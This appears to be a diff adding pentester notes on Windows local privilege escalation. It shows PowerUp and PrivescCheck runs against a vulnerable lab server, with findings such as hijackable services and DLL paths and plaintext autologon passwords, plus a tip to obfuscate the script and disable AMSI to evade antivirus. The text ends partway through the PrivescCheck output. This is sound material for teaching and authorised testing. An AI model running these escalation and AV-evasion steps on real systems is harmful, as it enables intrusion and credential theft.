@@ -1,0 +1,3191 @@
+======================================================================================================================
+======================================================================================================================
+Windows Privilege Escalation Scripts & Techniques
+======================================================================================================================
+
+There are numerous scripts that are useful to enumerate a Windows machine and find local privilege escalation flaws such as:
+- PowerUP
+- PrivescCheck
+- JAWS
+- WinPEAS
+- ...
+
+How to detect and exploit Windows local privilege escalation vulnerabilities:
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+- https://github.com/sagishahar/lpeworkshop
+- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
+- https://www.ired.team/offensive-security/privilege-escalation
+- ...
+
+
+======================================================================================================================
+1. PowerUP script
+======================================================================================================================
+
+The Powershell script 'PowerUp.ps1' aims to be a clearing-house of common Windows privilege escalation vectors that rely on misconfiguration.
+It can be used to both detect and exploit common privilege escalation flaws.
+Examples:
++ Token/Privilege Enumeration/Abuse
++ Service Enumeration and abuse
++ DLL Hijacking
++ Registry Checks
++ Miscellaneous Checks
++ ...
+  
+PowerUp is not supported anymore. 
+Github links (with the last commit date): 
+- 2017 > https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+- 2015 > https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+- 2014 > https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1
+
+Important note: Before running the PowerUP script it is important to obfuscate it a little and to disable the AMSI to avoid AV.
+
+
+Example - Output of the PowerUP script run on a vulnerable Windows server 2012 R2 with a low-privileged user
+======================================================================================================================
+
+- PowerUP version used: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+
+PS C:\> powershell -ep bypass
+PS C:\> import-module .\PowerUp.ps1
+PS C:\> invoke-allchecks
+
+[*] Running Invoke-AllChecks
+[*] Checking if user is in a local group with administrative privileges...
+
+[*] Checking for unquoted service paths...
+
+ServiceName    : unquosvc
+Path           : C:\Program Files\TH Application Service\Common Files\thservice.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'unquosvc' -Path <HijackPath>
+CanRestart     : True
+
+ServiceName    : unquosvc
+Path           : C:\Program Files\TH Application Service\Common Files\thservice.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'unquosvc' -Path <HijackPath>
+CanRestart     : True
+
+
+[*] Checking service executable and argument permissions...  
+
+ServiceName                     : filepermsvc
+Path                            : "C:\Program Files\File Application Service\fileservice.exe"
+ModifiableFile                  : C:\Program Files\File Application Service\fileservice.exe
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+ModifiableFileIdentityReference : WIN-EVAGJ1T16QD\user
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
+CanRestart                      : True
+
+
+[*] Checking service permissions... 
+
+ServiceName   : daclasvc
+Path          : "C:\Program Files\Clapplication\clservice.exe"
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'daclasvc'
+CanRestart    : True
+
+
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+%PATH%            : C:\Temp
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+%PATH%            : C:\Temp
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+%PATH%            : C:\Temp
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+%PATH%            : C:\Temp
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
+
+
+[*] Checking for AlwaysInstallElevated registry key...
+AbuseFunction : Write-UserAddMSI
+
+
+[*] Checking for Autologon credentials in registry...
+
+DefaultDomainName    : 
+DefaultUserName      : user
+DefaultPassword      : password321!
+AltDefaultDomainName : 
+AltDefaultUserName   : 
+AltDefaultPassword   : 
+
+
+[*] Checking for modifidable registry autoruns and configs... 
+
+Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
+Path           : "C:\Program Files\AutoProgram\program.exe"
+ModifiableFile : @{ModifiablePath=C:\Program Files\AutoProgram\program.exe; IdentityReference=Everyone; 
+                 Permissions=System.Object[]}
+
+[*] Checking for modifiable schtask files/configs...
+
+[*] Checking for unattended install files...
+UnattendPath : C:\Windows\Panther\Unattend.xml
+
+
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+[*] Checking for cached Group Policy Preferences .xml files....
+
+
+======================================================================================================================
+2. PrivescCheck script
+======================================================================================================================
+
+Github links: 
+> https://github.com/itm4n/PrivescCheck
+> https://github.com/itm4n/PrivescCheck/blob/master/INFORMATION.md
+
+This script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. 
+It also gathers various information that might be useful for exploitation and/or post-exploitation.
+
+Main commands
+-------------
+PS C:\Temp\> Invoke-PrivescCheck
+or
+PS C:\Temp\> Invoke-PrivescCheck -Extended
+
+
+Example - Output of the PrivescCheck script run on a vulnerable Windows server 2012 R2 with a low-privileged user
+======================================================================================================================
+
+PS C:\Users\backup> powershell -exec bypass
+Windows PowerShell
+Copyright (C) 2013 Microsoft Corporation. All rights reserved.
+
+PS C:\Users\backup> cd .\Documents
+
+PS C:\Users\backup\Documents> Invoke-PrivescCheck -Extended
+
++------+------------------------------------------------+------+
+| TEST | USER > Identity                                | INFO |
++------+------------------------------------------------+------+
+| DESC | Get the full name of the current user (domain +       |
+|      | username) along with the associated Security          |
+|      | Identifier (SID).                                     |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name                   SID
+----                   ---
+WIN-EVAGJ1T16QD\backup S-1-5-21-3698357007-189532211-3203426890-1008
+
++------+------------------------------------------------+------+
+| TEST | USER > Non-default Groups                      | INFO |
++------+------------------------------------------------+------+
+| DESC | List the groups the current user belongs to. Default  |
+|      | groups are filtered out to minimize the output.       |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name                         SID
+----                         ---
+BUILTIN\Remote Desktop Users S-1-5-32-555
+
++------+------------------------------------------------+------+
+| TEST | USER > Privileges                              | VULN |
++------+------------------------------------------------+------+
+| DESC | List the privileges that are associated to the        |
+|      | current user's token. If any of them can be leveraged |
+|      | to somehow run code in the context of the SYSTEM      |
+|      | account, it will be reported as a finding.            |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | USER > Environment Variables                   | INFO |
++------+------------------------------------------------+------+
+| DESC | List the environment variables of the current process |
+|      | and try to identify any potentially sensitive         |
+|      | information such as passwords or API secrets. This    |
+|      | check is simply based on keyword matching and might   |
+|      | not be entirely reliable.                             |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | SERVICES > Non-default Services                | INFO |
++------+------------------------------------------------+------+
+| DESC | List all registered services and filter out the ones  |
+|      | that are built into Windows. It does so by parsing    |
+|      | the target executable's metadata.                     |
++------+-------------------------------------------------------+
+[*] Found 8 result(s).
+
+Name        : daclasvc
+DisplayName : Clapplication
+ImagePath   : "C:\Program Files\Clapplication\clservice.exe"
+User        : LocalSystem
+StartMode   : Manual
+
+Name        : dellasvc
+DisplayName : CkService
+ImagePath   : "C:\Program Files\Ckapplication\ckservice.exe"
+User        : LocalSystem
+StartMode   : Manual
+
+Name        : filepermsvc
+DisplayName : File Application Service
+ImagePath   : "C:\Program Files\File Application Service\fileservice.exe"
+User        : LocalSystem
+StartMode   : Manual
+
+Name        : jenkinsApache
+DisplayName : jenkinsApache
+ImagePath   : "C:\Bitnami\JENKIN~1.1-0\apache2\bin\httpd.exe" -k runservice
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : jenkinsGradle
+DisplayName : jenkinsGradle (managed by WinServ)
+ImagePath   : "C:\Bitnami\JENKIN~1.1-0\gradle\scripts\winserv.exe"
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : jenkinsTomcat
+DisplayName : jenkinsTomcat
+ImagePath   : C:\Bitnami\JENKIN~1.1-0\APACHE~1\bin\tomcat8.exe //RS//jenkinsTomcat
+User        : LocalSystem
+StartMode   : Automatic
+
+Name        : reginasvc
+DisplayName : Secure App Service
+ImagePath   : "C:\Program Files\Secure App Service\ryservice.exe"
+User        : LocalSystem
+StartMode   : Manual
+
+Name        : unquosvc
+DisplayName : TH Application Service
+ImagePath   : C:\Program Files\TH Application Service\Common Files\thservice.exe
+User        : LocalSystem
+StartMode   : Manual
+
++------+------------------------------------------------+------+
+| TEST | SERVICES > Service Permissions                 | VULN |
++------+------------------------------------------------+------+
+| DESC | Interact with the Service Control Manager (SCM) and   |
+|      | check whether the current user can modify any         |
+|      | registered service.                                   |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name              : daclasvc
+ImagePath         : "C:\Program Files\Clapplication\clservice.exe"
+User              : LocalSystem
+AccessRights      : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, Interrogate, ReadControl
+IdentityReference : Everyone
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : True
+
++------+------------------------------------------------+------+
+| TEST | SERVICES > Registry Permissions                | VULN |
++------+------------------------------------------------+------+
+| DESC | Parse the registry and check whether the current user |
+|      | can modify the configuration of any registered        |
+|      | service.                                              |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name              : reginasvc
+ImagePath         : "C:\Program Files\Secure App Service\ryservice.exe"
+User              : LocalSystem
+ModifiablePath    : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\reginasvc
+IdentityReference : NT AUTHORITY\INTERACTIVE
+Permissions       : {WriteOwner, Delete, ReadControl, ReadData/ListDirectory...}
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : True
+
++------+------------------------------------------------+------+
+| TEST | SERVICES > Binary Permissions                  | VULN |
++------+------------------------------------------------+------+
+| DESC | List all services and check whether the current user  |
+|      | can modify the target executable or write files in    |
+|      | its parent folder.                                    |
++------+-------------------------------------------------------+
+[*] Found 5 result(s).
+
+Name              : filepermsvc
+ImagePath         : "C:\Program Files\File Application Service\fileservice.exe"
+User              : LocalSystem
+ModifiablePath    : C:\Program Files\File Application Service\fileservice.exe
+IdentityReference : Everyone
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : True
+
+Name              : jenkinsApache
+ImagePath         : "C:\Bitnami\JENKIN~1.1-0\apache2\bin\httpd.exe" -k runservice
+User              : LocalSystem
+ModifiablePath    : C:\Bitnami\JENKIN~1.1-0\apache2\bin
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+Status            : Running
+UserCanStart      : False
+UserCanStop       : False
+
+Name              : jenkinsApache
+ImagePath         : "C:\Bitnami\JENKIN~1.1-0\apache2\bin\httpd.exe" -k runservice
+User              : LocalSystem
+ModifiablePath    : C:\Bitnami\JENKIN~1.1-0\apache2\bin
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+Status            : Running
+UserCanStart      : False
+UserCanStop       : False
+
+Name              : jenkinsGradle
+ImagePath         : "C:\Bitnami\JENKIN~1.1-0\gradle\scripts\winserv.exe"
+User              : LocalSystem
+ModifiablePath    : C:\Bitnami\JENKIN~1.1-0\gradle\scripts
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+Status            : Running
+UserCanStart      : False
+UserCanStop       : False
+
+Name              : jenkinsGradle
+ImagePath         : "C:\Bitnami\JENKIN~1.1-0\gradle\scripts\winserv.exe"
+User              : LocalSystem
+ModifiablePath    : C:\Bitnami\JENKIN~1.1-0\gradle\scripts
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+Status            : Running
+UserCanStart      : False
+UserCanStop       : False
+
++------+------------------------------------------------+------+
+| TEST | SERVICES > Unquoted Path                       | VULN |
++------+------------------------------------------------+------+
+| DESC | List registered services and check whether any of     |
+|      | them is configured with an unquoted path that can be  |
+|      | exploited.                                            |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name              : unquosvc
+ImagePath         : C:\Program Files\TH Application Service\Common Files\thservice.exe
+User              : LocalSystem
+ModifiablePath    : C:\Program Files\TH Application Service
+IdentityReference : BUILTIN\Users
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+Status            : Stopped
+UserCanStart      : True
+UserCanStop       : True
+
++------+------------------------------------------------+------+
+| TEST | SERVICES > SCM Permissions                     | VULN |
++------+------------------------------------------------+------+
+| DESC | Check whether the current user can perform any        |
+|      | privileged actions on the Service Control Manager     |
+|      | (SCM).                                                |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | APPS > Non-default Apps                        | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate non-default and third-party applications by |
+|      | parsing the registry.                                 |
++------+-------------------------------------------------------+
+[*] Found 6 result(s).
+
+Name                     FullPath
+----                     --------
+AutoProgram              C:\Program Files\AutoProgram
+Ckapplication            C:\Program Files\Ckapplication
+Clapplication            C:\Program Files\Clapplication
+File Application Service C:\Program Files\File Application Service
+Secure App Service       C:\Program Files\Secure App Service
+TH Application Service   C:\Program Files\TH Application Service
+
++------+------------------------------------------------+------+
+| TEST | APPS > Modifiable Apps                         | VULN |
++------+------------------------------------------------+------+
+| DESC | List non-default and third-party applications and     |
+|      | report the ones that can be modified by the current   |
+|      | user.                                                 |
++------+-------------------------------------------------------+
+[*] Found 2 result(s).
+
+ModifiablePath    : C:\Program Files\AutoProgram\program.exe
+IdentityReference : Everyone
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+
+ModifiablePath    : C:\Program Files\File Application Service\fileservice.exe
+IdentityReference : Everyone
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+
++------+------------------------------------------------+------+
+| TEST | APPS > ProgramData folders/files               | INFO |
++------+------------------------------------------------+------+
+| DESC | List the non-default ProgramData folders and check    |
+|      | whether the current user has write permissions. This  |
+|      | check is purely informative and the results require   |
+|      | manual analysis.                                      |
++------+-------------------------------------------------------+
+[*] Found 8 result(s).
+
+ModifiablePath    : C:\ProgramData\McAfee\Common Framework
+IdentityReference : BUILTIN\Users
+Permissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes, WriteData/AddFile}
+
+ModifiablePath    : C:\ProgramData\McAfee\Common Framework
+IdentityReference : BUILTIN\Users
+Permissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes, WriteData/AddFile}
+
+ModifiablePath    : C:\ProgramData\Oracle\Java
+IdentityReference : BUILTIN\Users
+Permissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes, WriteData/AddFile}
+
+ModifiablePath    : C:\ProgramData\Oracle\Java\.oracle_jre_usage
+IdentityReference : Everyone
+Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
+
+ModifiablePath    : C:\ProgramData\Oracle\Java\.oracle_jre_usage
+IdentityReference : BUILTIN\Users
+Permissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes, WriteData/AddFile}
+
+ModifiablePath    : C:\ProgramData\Oracle\Java\.oracle_jre_usage
+IdentityReference : Everyone
+Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
+
+ModifiablePath    : C:\ProgramData\Oracle\Java\.oracle_jre_usage
+IdentityReference : BUILTIN\Users
+Permissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes, WriteData/AddFile}
+
+ModifiablePath    : C:\ProgramData\Oracle\Java\.oracle_jre_usage\485cca34334622a0.timestamp
+IdentityReference : Everyone
+Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
+
++------+------------------------------------------------+------+
+| TEST | APPS > Startup Apps                            | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate the system-wide applications that are run   |
+|      | on start-up.                                          |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name         : My Program
+Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\My Program
+Data         : "C:\Program Files\AutoProgram\program.exe"
+IsModifiable : True
+
++------+------------------------------------------------+------+
+| TEST | APPS > Modifiable Startup Apps                 | VULN |
++------+------------------------------------------------+------+
+| DESC | Enumerate the system-wide applications that are run   |
+|      | on start-up and check whether they can be modified by |
+|      | the current user.                                     |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name         : My Program
+Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\My Program
+Data         : "C:\Program Files\AutoProgram\program.exe"
+IsModifiable : True
+
++------+------------------------------------------------+------+
+| TEST | APPS > Running Processes                       | INFO |
++------+------------------------------------------------+------+
+| DESC | List processes that are not owned by the current user |
+|      | and filter out common processes such as               |
+|      | 'svchost.exe'.                                        |
++------+-------------------------------------------------------+
+[*] Found 12 result(s).
+
+Name      PID User Path SessionId
+----      --- ---- ---- ---------
+cmd      1028 N/A               0
+conhost  1036 N/A               0
+conhost  1044 N/A               0
+httpd     532 N/A               0
+httpd    1140 N/A               0
+java     1104 N/A               0
+lsass     452 N/A               0
+spoolsv   436 N/A               0
+tomcat8   292 N/A               0
+wininit   352 N/A               0
+winlogon  380 N/A               1
+winserv   964 N/A               0
+
++------+------------------------------------------------+------+
+| TEST | SCHEDULED TASKS > Binary Permissions           | VULN |
++------+------------------------------------------------+------+
+| DESC | Enumerate the scheduled tasks that are not owned by   |
+|      | the current user and checks whether the target binary |
+|      | can be modified. Note that, as a low-privileged user, |
+|      | it's not possible to enumerate all the scheduled      |
+|      | tasks.                                                |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | SCHEDULED TASKS > Unquoted Path                | VULN |
++------+------------------------------------------------+------+
+| DESC | Enumerate the scheduled tasks that are not owned by   |
+|      | the current user and checks whether the corresponding |
+|      | command uses an exploitable unquoted path. Note that, |
+|      | as a low-privileged user, it's not possible to        |
+|      | enumerate all the scheduled tasks.                    |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | CREDS > SAM/SYSTEM Backup Files                | VULN |
++------+------------------------------------------------+------+
+| DESC | Check whether some backup files of the SAM/SYSTEM     |
+|      | hives were created with insecure permissions."        |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | CREDS > Unattend Files                         | VULN |
++------+------------------------------------------------+------+
+| DESC | Locate 'Unattend' files and check whether they        |
+|      | contain any clear-text credentials.                   |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Type     : AutoLogon
+Domain   :
+Username : Admin
+Password : ??????
+File     : C:\Windows\Panther\Unattend.xml
+
++------+------------------------------------------------+------+
+| TEST | CREDS > WinLogon                               | VULN |
++------+------------------------------------------------+------+
+| DESC | Parse the Winlogon registry keys and check whether    |
+|      | they contain any clear-text password. Entries that    |
+|      | have an empty password field are filtered out.        |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Domain   :
+Username : user
+Password : password321
+
++------+------------------------------------------------+------+
+| TEST | CREDS > Credential Files                       | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate the credential files that are present in    |
+|      | the current user's HOME folder. This is purely        |
+|      | informative.                                          |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | CREDS > Credential Manager                     | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate the credentials that are saved in the       |
+|      | current user's vault.                                 |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | CREDS > Credential Manager (web)               | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate the web credentials that are saved in the   |
+|      | current user's Vault.                                 |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | CREDS > GPP Passwords                          | VULN |
++------+------------------------------------------------+------+
+| DESC | Locate old cached Group Policy Preference files that  |
+|      | contain a 'cpassword' field and extract the           |
+|      | clear-text credentials.                               |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | CREDS > PowerShell History                     | INFO |
++------+------------------------------------------------+------+
+| DESC | Locate the current user's PowerShell history file and |
+|      | check whether it contains some clear-text             |
+|      | credentials. This check is simply based on keyword    |
+|      | matching and might not be entirely reliable.          |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | HARDENING > UAC Settings                       | INFO |
++------+------------------------------------------------+------+
+| DESC | Retrieve the User Access Control (UAC) configuration  |
+|      | and check whether it is enabled.                      |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Path      : HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+EnableLUA : 1
+Enabled   : True
+
++------+------------------------------------------------+------+
+| TEST | HARDENING > LSA protections                    | INFO |
++------+------------------------------------------------+------+
+| DESC | Check whether 'lsass' runs as a Protected Process     |
+|      | Light and/or if Credential Guard is enabled.          |
++------+-------------------------------------------------------+
+[*] Found 4 result(s).
+
+Name             Status Description
+----             ------ -----------
+RunAsPPL          False RunAsPPL is not configured
+UEFI              False BIOS mode is Legacy
+Secure Boot       False Secure Boot is not supported
+Credential Guard  False Credential Guard is not supported on this OS
+
++------+------------------------------------------------+------+
+| TEST | HARDENING > LAPS Settings                      | INFO |
++------+------------------------------------------------+------+
+| DESC | Parse the registry and determine whether LAPS is      |
+|      | configured and enabled.                               |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | HARDENING > PowerShell Transcription           | INFO |
++------+------------------------------------------------+------+
+| DESC | Check whether PowerShell Transcription is configured  |
+|      | and enabled. If so, the path of the output log file   |
+|      | will be returned.                                     |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | HARDENING > BitLocker                          | VULN |
++------+------------------------------------------------+------+
+| DESC | Check whether BitLocker is configured and enabled on  |
+|      | the system drive. Note that this check will yield a   |
+|      | false positive if another encryption software is in   |
+|      | use.                                                  |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | CONFIG > PATH Folder Permissions               | VULN |
++------+------------------------------------------------+------+
+| DESC | Retrieve the list of SYSTEM %PATH% folders and check  |
+|      | whether the current user has some write permissions   |
+|      | in any of them.                                       |
++------+-------------------------------------------------------+
+[*] Found 4 result(s).
+
+Path              : C:\Temp
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+
+Path              : C:\Temp
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+
+Path              : C:\Temp
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : AppendData/AddSubdirectory
+
+Path              : C:\Temp
+ModifiablePath    : C:\Temp
+IdentityReference : BUILTIN\Users
+Permissions       : WriteData/AddFile
+
++------+------------------------------------------------+------+
+| TEST | MISC > Hijackable DLLs                         | INFO |
++------+------------------------------------------------+------+
+| DESC | List Windows services that are prone to Ghost DLL     |
+|      | hijacking. This is particularly relevant if the       |
+|      | current user can create files in one of the SYSTEM    |
+|      | %PATH% folders.                                       |
++------+-------------------------------------------------------+
+[*] Found 1 result(s).
+
+Name           : wlanapi.dll
+Description    : Loaded by NetMan when listing network interfaces
+RunAs          : LocalSystem
+RebootRequired : False
+
++------+------------------------------------------------+------+
+| TEST | CONFIG > AlwaysInstallElevated                 | VULN |
++------+------------------------------------------------+------+
+| DESC | Check whether the 'AlwaysInstallElevated' registry    |
+|      | keys are configured and enabled. If so any user might |
+|      | be able to run arbitary MSI files with SYSTEM         |
+|      | privileges.                                           |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | CONFIG > WSUS Configuration                    | VULN |
++------+------------------------------------------------+------+
+| DESC | If WSUS is in use, this check will determine whether  |
+|      | or not it uses a secure URL. If not, it might be      |
+|      | vulnerable to MitM attacks (c.f. 'WSUXploit' /        |
+|      | 'WSuspicious').                                       |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | CONFIG > SCCM Cache Folder                     | INFO |
++------+------------------------------------------------+------+
+| DESC | Checks whether the SCCM cache folder exists. Manual   |
+|      | investigation might be required during                |
+|      | post-exploitation.                                    |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | CONFIG > SCCM Cache Folder                     | VULN |
++------+------------------------------------------------+------+
+| DESC | Checks whether the current user can browse the SCCM   |
+|      | cache folder. If so, hardcoded credentials might be   |
+|      | extracted from MSI package files or scripts.          |
++------+-------------------------------------------------------+
+[!] Not vulnerable.
+
++------+------------------------------------------------+------+
+| TEST | NETWORK > TCP Endpoints                        | INFO |
++------+------------------------------------------------+------+
+| DESC | List all TCP ports that are in a LISTEN state. For    |
+|      | each one, the corresponding process is also returned. |
++------+-------------------------------------------------------+
+[*] Found 33 result(s).
+
+IP   Proto LocalAddress     State      PID Name
+--   ----- ------------     -----      --- ----
+IPv4 TCP   0.0.0.0:80       LISTENING  532 httpd
+IPv4 TCP   0.0.0.0:135      LISTENING  536 svchost
+IPv4 TCP   0.0.0.0:443      LISTENING  532 httpd
+IPv4 TCP   0.0.0.0:445      LISTENING    4 System
+IPv4 TCP   0.0.0.0:3389     LISTENING 1828 svchost
+IPv4 TCP   0.0.0.0:5985     LISTENING    4 System
+IPv4 TCP   0.0.0.0:8009     LISTENING  292 tomcat8
+IPv4 TCP   0.0.0.0:47001    LISTENING    4 System
+IPv4 TCP   0.0.0.0:49152    LISTENING  352 wininit
+IPv4 TCP   0.0.0.0:49153    LISTENING  676 svchost
+IPv4 TCP   0.0.0.0:49154    LISTENING  720 svchost
+IPv4 TCP   0.0.0.0:49155    LISTENING  436 spoolsv
+IPv4 TCP   0.0.0.0:49157    LISTENING  444 services
+IPv4 TCP   0.0.0.0:49158    LISTENING 1856 svchost
+IPv4 TCP   0.0.0.0:49159    LISTENING 1104 java
+IPv4 TCP   0.0.0.0:49160    LISTENING  452 lsass
+IPv4 TCP   127.0.0.1:8005   LISTENING  292 tomcat8
+IPv4 TCP   192.168.1.50:139 LISTENING    4 System
+IPv6 TCP   [::]:80          LISTENING  532 httpd
+IPv6 TCP   [::]:135         LISTENING  536 svchost
+IPv6 TCP   [::]:443         LISTENING  532 httpd
+IPv6 TCP   [::]:445         LISTENING    4 System
+IPv6 TCP   [::]:3389        LISTENING 1828 svchost
+IPv6 TCP   [::]:5985        LISTENING    4 System
+IPv6 TCP   [::]:47001       LISTENING    4 System
+IPv6 TCP   [::]:49152       LISTENING  352 wininit
+IPv6 TCP   [::]:49153       LISTENING  676 svchost
+IPv6 TCP   [::]:49154       LISTENING  720 svchost
+IPv6 TCP   [::]:49155       LISTENING  436 spoolsv
+IPv6 TCP   [::]:49157       LISTENING  444 services
+IPv6 TCP   [::]:49158       LISTENING 1856 svchost
+IPv6 TCP   [::]:49159       LISTENING 1104 java
+IPv6 TCP   [::]:49160       LISTENING  452 lsass
+
++------+------------------------------------------------+------+
+| TEST | NETWORK > UDP Endpoints                        | INFO |
++------+------------------------------------------------+------+
+| DESC | List all UDP ports that are in a LISTEN state. For    |
+|      | each one, the corresponding process is also returned. |
+|      | DNS is filtered out to minimize the output.           |
++------+-------------------------------------------------------+
+[*] Found 16 result(s).
+
+IP   Proto LocalAddress     State  PID Name
+--   ----- ------------     -----  --- ----
+IPv4 UDP   0.0.0.0:500      N/A    720 svchost
+IPv4 UDP   0.0.0.0:3389     N/A   1828 svchost
+IPv4 UDP   0.0.0.0:4500     N/A    720 svchost
+IPv4 UDP   0.0.0.0:5353     N/A    292 tomcat8
+IPv4 UDP   0.0.0.0:5355     N/A    864 svchost
+IPv4 UDP   0.0.0.0:33848    N/A    292 tomcat8
+IPv4 UDP   0.0.0.0:54959    N/A   1104 java
+IPv4 UDP   192.168.1.50:137 N/A      4 System
+IPv4 UDP   192.168.1.50:138 N/A      4 System
+IPv6 UDP   [::]:500         N/A    720 svchost
+IPv6 UDP   [::]:3389        N/A   1828 svchost
+IPv6 UDP   [::]:4500        N/A    720 svchost
+IPv6 UDP   [::]:5353        N/A    292 tomcat8
+IPv6 UDP   [::]:5355        N/A    864 svchost
+IPv6 UDP   [::]:33848       N/A    292 tomcat8
+IPv6 UDP   [::]:54959       N/A   1104 java
+
++------+------------------------------------------------+------+
+| TEST | NETWORK > Saved Wifi Profiles                  | INFO |
++------+------------------------------------------------+------+
+| DESC | Enumerate saved Wifi profiles and extract clear-text  |
+|      | WEP/WPA pre-shared keys and passphrases (if           |
+|      | applicable).                                          |
++------+-------------------------------------------------------+
+[!] Nothing found.
+
++------+------------------------------------------------+------+
+| TEST | UPDATES > Last Windows Update Date             | INFO |
